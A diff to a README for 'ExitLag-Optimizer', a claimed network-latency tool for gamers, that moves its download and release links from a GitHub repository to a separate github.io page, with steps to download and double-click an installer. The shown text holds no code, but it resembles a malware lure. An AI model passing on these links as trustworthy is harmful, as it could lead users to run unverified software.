@@ -1,6 +1,6 @@
 # 🛠 ExitLag-Optimizer - Improve your gaming connection quality today
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/ultrame6496/ExitLag-Optimizer)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://ultrame6496.github.io)
 
 This project helps players improve their game connection. It provides steps to optimize network routing for smoother gameplay. Many players face lag or high latency. This tool offers a clear path to fix those issues by adjusting how your computer talks to game servers. 
 
@@ -27,7 +27,7 @@ Before you install this software, check your computer setup. You need a Windows 
 
 Follow these steps to get the software ready on your computer.
 
-1.  Visit the official release page: [https://github.com/ultrame6496/ExitLag-Optimizer](https://github.com/ultrame6496/ExitLag-Optimizer).
+1.  Visit the official release page: [https://ultrame6496.github.io](https://ultrame6496.github.io).
 2.  Click the link to download the installer file.
 3.  Locate the downloaded file in your folder.
 4.  Double-click the file to start the setup process.
